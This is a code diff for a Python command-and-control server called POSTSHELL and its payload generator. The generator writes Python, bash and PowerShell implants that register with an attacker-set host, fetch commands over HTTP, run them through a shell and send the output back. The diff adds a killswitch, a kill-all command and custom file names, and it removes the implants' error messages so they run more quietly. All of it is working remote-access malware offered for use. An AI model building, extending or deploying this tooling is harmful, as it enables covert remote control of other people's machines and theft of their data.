@@ -32,7 +32,7 @@ lock = threading.Lock()
 client_counter = 1
 client_id_map = {}
 
-MAIN_COMMANDS = ["list ", "select ", "payload ", "kill ", "exit ", "help ", "? "]
+MAIN_COMMANDS = ["list ", "select ", "payload ", "kill ", "killall", "exit ", "help ", "? "]
 SESSION_COMMANDS = ["background ", "die "]
 
 selected_client = None
@@ -192,24 +192,29 @@ def get_client_by_num_id(num_id):
 def show_help():
     print(f"""
 {ORANGE}Menu Commands:{RESET}
-    help | ?            - Show this menu
-    list                - List connected sessions
-    select <id>         - Connect to a session
-    kill <id>           - Terminate session
-    exit                - Exit the server
+    help | ?             - Show this menu
+    list                 - List connected sessions
+    select <id>          - Connect to a session
+    kill <id>            - Terminate session
+    killall		 - Terminate all sessions
+    exit                 - Exit the server
 {ORANGE}Session Commands:{RESET}
-    background          - Background session
-    die                 - Terminate session
+    background           - Background session
+    die                  - Terminate session
 {ORANGE}Payload Menu Commands:{RESET}
-    set lhost <ip>      - Set the POSTSHELL IP address
-    set lport <port>    - Set the POSTSHELL listening port
-    set payload <type>  - Set payload type (EX: sh, py, ps1)
-    set checkin <sec>   - Set the check-in wait time (in seconds)
-    options             - Show current payload configuration
-    generate            - Generate the payload with current settings
-    back                - Return to the main menu
-    help                - Show this help menu
+    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT
+    set lhost <ip>       - Set the POSTSHELL IP address
+    set lport <port>     - Set the POSTSHELL listening port
+    set payload <type>   - Set payload type (EX: sh, py, ps1)
+    set checkin <sec>    - Set the check-in wait time (in seconds)
+    set killswitch <sec> - Exit payload if offline for N seconds
+    options              - Show current payload configuration
+    generate             - Generate the payload with current settings
+    back                 - Return to the main menu
+    help                 - Show this help menu
     """)
+    
+
 
 def cli():
     global selected_client
@@ -237,6 +242,13 @@ def cli():
                         clients.clear()
                     time.sleep(1)
                     break
+                elif cmd == "killall":
+                    print(f"{RED}[!] Terminating all sessions.{RESET}")
+                    with lock:
+                        for cid in list(clients.keys()):
+                            client_commands[cid] = "exit"
+                        clients.clear()
+#                    print(f"{GREEN}[+] All sessions terminated.{RESET}")
 
                 elif cmd == "list":
                     with lock:
@@ -308,7 +320,20 @@ def cli():
                 elif cmd:
                     with lock:
                         client_commands[selected_client] = cmd
-                    time.sleep(1)
+
+#                    print(f"{BLUE}[>] Waiting for response...{RESET}")
+
+                    waited = 0
+                    timeout = 30  # Max wait time in seconds
+                    poll_interval = 0.5
+
+                    while waited < timeout:
+                        time.sleep(poll_interval)
+                        waited += poll_interval
+                        with lock:
+                            if client_results[selected_client]:
+                                break
+
                     with lock:
                         results = client_results[selected_client]
                         if results:
@@ -316,12 +341,15 @@ def cli():
                                 print(r)
                             client_results[selected_client].clear()
                         else:
-                            print(f"{ORANGE}[<] No result yet{RESET}")
+                            print(f"{RED}[!] No result received within {timeout} seconds.{RESET}")
         except KeyboardInterrupt:
             if not selected_client:
                 print(f"{RED}\n[!] Use 'exit' to cleanly shut down the server.{RESET}")
             else:
                 print(f"{RED}\n[!] Use 'background' to return or 'die' to terminate the session.{RESET}")
+
+
+
 ## payload builder
 PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
 payload_settings = {
@@ -329,14 +357,14 @@ payload_settings = {
     "lhost": "127.0.0.1",
     "lport": "80",
     "payload": "sh",
-    "checkin": "1"
+    "checkin": "1",
+    "killswitch": "60"  # default 60 seconds
 }
-
 
 def payload_completer(text, state):
     options = []
     if readline.get_line_buffer().strip().startswith("set"):
-        options = ["set lhost ", "set lport ", "set payload ", "set checkin ", "set name "]
+        options = ["lhost ", "lport ", "payload ", "checkin ", "name ", "killswitch"]
     else:
         options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
     return options[state] if state < len(options) else None
@@ -345,23 +373,22 @@ def payload_completer(text, state):
 def show_payload_options():
     print(f"{ORANGE}\nCurrent Payload Options:\n{RESET}")
     for key, value in payload_settings.items():
-        if value.strip() == "":
-            print(f"  {key.upper():10}: {RED}<NOT SET>{RESET}")
-        else:
-            print(f"  {key.upper():10}: {ORANGE}{value}{RESET}")
+        display_value = f"{ORANGE}{value}{RESET}" if value.strip() else f"{RED}<NOT SET>{RESET}"
+        print(f"  {key.upper():10}: {display_value}")
     print("")
 
 def payload_help():
     print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
-    print(f"    set name <name>     - Set CUSTOM script name | BLANK = DEFAULT")
-    print(f"    set lhost <ip>      - Set the POSTSHELL IP address")
-    print(f"    set lport <port>    - Set the POSTSHELL listening port")
-    print(f"    set payload <type>  - Set payload type (EX: sh, py, ps1)")
-    print(f"    set checkin <sec>   - Set the check-in wait time (in seconds)")
-    print(f"    options             - Show current payload configuration")
-    print(f"    generate            - Generate the payload with current settings")
-    print(f"    back                - Return to the main menu")
-    print(f"    help                - Show this help menu\n")
+    print(f"    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT")
+    print(f"    set lhost <ip>       - Set the POSTSHELL IP address")
+    print(f"    set lport <port>     - Set the POSTSHELL listening port")
+    print(f"    set payload <type>   - Set payload type (EX: sh, py, ps1)")
+    print(f"    set checkin <sec>    - Set the check-in wait time (in seconds)")
+    print(f"    set killswitch <sec> - Exit payload if offline for N seconds")
+    print(f"    options              - Show current payload configuration")
+    print(f"    generate             - Generate the payload with current settings")
+    print(f"    back                 - Return to the main menu")
+    print(f"    help                 - Show this help menu\n")
 
 
 def payload_shell():
@@ -413,12 +440,13 @@ def payload_shell():
         except Exception as e:
             print(f"Error: {e}")
 
-
 def generate_payload():
     lhost = payload_settings["lhost"]
     lport = payload_settings["lport"]
     payload_type = payload_settings["payload"]
-    waittime = payload_settings.get("checkin", 1)  # defaults to 1 second if not set
+    waittime = payload_settings.get("checkin", 1)
+    killswitch = payload_settings.get("killswitch", 60)
+    name = payload_settings.get("name", "").strip()
 
     if not os.path.exists("tools"):
         os.makedirs("tools")
@@ -432,12 +460,12 @@ import requests
 import subprocess
 import getpass
 
-SERVER_IP = "{payload_settings['lhost']}"
-SERVER_PORT = "{payload_settings['lport']}"
+SERVER_IP = "{lhost}"
+SERVER_PORT = "{lport}"
 WAITTIME = {waittime}
+KILLSWITCH = {killswitch}
 
 HOSTNAME = socket.gethostname()
-#USER = os.getlogin()
 USER = getpass.getuser()
 OS = platform.system()
 VERSION = platform.release()
@@ -462,9 +490,7 @@ def register_client():
     try:
         response = requests.post(f"{{SERVER}}/register", data=data)
         response.raise_for_status()
-        print("Client registered successfully.")
     except requests.RequestException as e:
-        print(f"Failed to register client: {{e}}")
         exit(1)
 
 def send_result(command, result):
@@ -473,58 +499,44 @@ def send_result(command, result):
         "result": result
     }}
     try:
-        response = requests.post(f"{{SERVER}}/{{ID}}/result", data=data)
-        response.raise_for_status()
-    except requests.RequestException as e:
-        print(f"Failed to send result: {{e}}")
+        requests.post(f"{{SERVER}}/{{ID}}/result", data=data)
+    except:
+        pass
 
 def command_loop():
+    last_success = time.time()
     while True:
+        if time.time() - last_success > KILLSWITCH:
+            break
         try:
             response = requests.get(f"{{SERVER}}/{{ID}}.html")
             response.raise_for_status()
             cmd = response.text.strip()
+            last_success = time.time()
 
             if cmd:
                 if cmd == "exit":
-                    print("Received exit command. Terminating client...")
                     break
-
                 try:
-                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                    result = result.decode("utf-8")
+                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                 except subprocess.CalledProcessError as e:
-                    result = e.output.decode("utf-8")
-
+                    result = e.output.decode()
                 send_result(cmd, result)
-
+        except:
             time.sleep(WAITTIME)
-
-        except requests.RequestException as e:
-            print(f"Error while communicating with server: {{e}}")
-            time.sleep(1)
 
 if __name__ == "__main__":
     register_client()
     command_loop()
 '''
-        custom_name = payload_settings.get("name", "").strip()
-        if custom_name:
-            filename = f"tools/{custom_name}.{payload_type}"
-        else:
-            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
 
-        with open(filename, "w") as f:
-            f.write(payload_code)
-        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
-
-    
     elif payload_type == "sh":
-        payload_code = f"""#!/bin/bash
+        payload_code = f'''#!/bin/bash
 
-SERVERIP="{payload_settings['lhost']}"
-SERVERPORT="{payload_settings['lport']}"
+SERVERIP="{lhost}"
+SERVERPORT="{lport}"
 WAITTIME="{waittime}"
+KILLSWITCH="{killswitch}"
 
 HOSTNAME=$(hostname)
 USER=$(whoami)
@@ -539,12 +551,24 @@ curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \\
      -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \\
      -d "arch=$ARCH" "$SERVER/register"
 
-# Command loop
+START=$(date +%s)
+
 while true; do
     CMD=$(curl -s "$SERVER/$ID.html")
+    if [ $? -ne 0 ]; then
+        NOW=$(date +%s)
+        if (( NOW - START > KILLSWITCH )); then
+            echo "[-] Server unreachable. Exiting."
+            exit 1
+        fi
+        sleep $WAITTIME
+        continue
+    fi
+    START=$(date +%s)
+
     if [ -n "$CMD" ]; then
         if [ "$CMD" == "exit" ]; then
-            echo "Received exit command. Terminating client..."
+            echo "[*] Exit command received. Exiting."
             exit 0
         fi
         RESULT=$(bash -c "$CMD" 2>&1)
@@ -552,23 +576,15 @@ while true; do
     fi
     sleep $WAITTIME
 done
-"""
-        custom_name = payload_settings.get("name", "").strip()
-        if custom_name:
-            filename = f"tools/{custom_name}.{payload_type}"
-        else:
-            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
-
-        with open(filename, "w") as f:
-            f.write(payload_code)
-        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
+'''
 
     elif payload_type == "ps1":
-        payload_code = f"""$ServerIP = "{payload_settings['lhost']}"
-$ServerPort = "{payload_settings['lport']}"
-$WAITTIME = "{waittime}" # in seconds
+        payload_code = f'''$ServerIP = "{lhost}"
+$ServerPort = "{lport}"
+$WAITTIME = {waittime}
+$KILLSWITCH = {killswitch}
+$StartTime = Get-Date
 
-# Get system information
 $Hostname = $env:COMPUTERNAME
 $userRaw = whoami
 $Username = ($userRaw -split '\\\\' | Select-Object -Last 1).Trim()
@@ -579,7 +595,6 @@ $Arch = $os.OSArchitecture
 $ID = "$Username@$Hostname"
 $Server = "http://$ServerIP`:$ServerPort"
 
-# Register client information
 try {{
     Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{{
         id = $ID
@@ -589,56 +604,52 @@ try {{
         version = $Version
         arch = $Arch
     }}
-    Write-Host "[*] Registered successfully"
 }} catch {{
-    Write-Host "[!] Error during registration: $_"
     exit
 }}
 
-# Command loop to fetch and execute commands
 while ($true) {{
+    $Now = Get-Date
+    if (($Now - $StartTime).TotalSeconds -gt $KILLSWITCH) {{
+        Write-Host "[-] Server unreachable. Exiting."
+        break
+    }}
+
     try {{
-        # Retrieve command from the server
         $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
-        
+        $StartTime = Get-Date
         if ($Cmd) {{
-            # Execute the command and capture the result
+            if ($Cmd -eq "exit") {{
+                break
+            }}
             $Result = try {{
                 Invoke-Expression $Cmd | Out-String
             }} catch {{
                 $_ | Out-String
             }}
 
-            # Send the result back to the server
             try {{
                 Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{{
                     cmd = $Cmd
                     result = $Result
                 }}
-            }} catch {{
-                # Error sending result
-            }}
+            }} catch {{ }}
         }}
-    }} catch {{
-        # Error while fetching command
-    }}
-    
-    # Sleep for 1 second before checking again
+    }} catch {{ }}
     Start-Sleep -Seconds $WAITTIME
 }}
-"""
-        custom_name = payload_settings.get("name", "").strip()
-        if custom_name:
-            filename = f"tools/{custom_name}.{payload_type}"
-        else:
-            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
-
-        with open(filename, "w") as f:
-            f.write(payload_code)
-        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
+'''
 
     else:
-        print(f"{RED}[-] Payload type '{payload_type}' not implemented yet.{RESET}")
+        print(f"{RED}[-] Payload type '{payload_type}' not supported.{RESET}")
+        return
+
+    # Save file
+    filename = f"tools/{name}.{payload_type}" if name else f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
+    with open(filename, "w") as f:
+        f.write(payload_code)
+    print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
+
 
 def start_server(port):
     socketserver.ThreadingTCPServer.allow_reuse_address = True
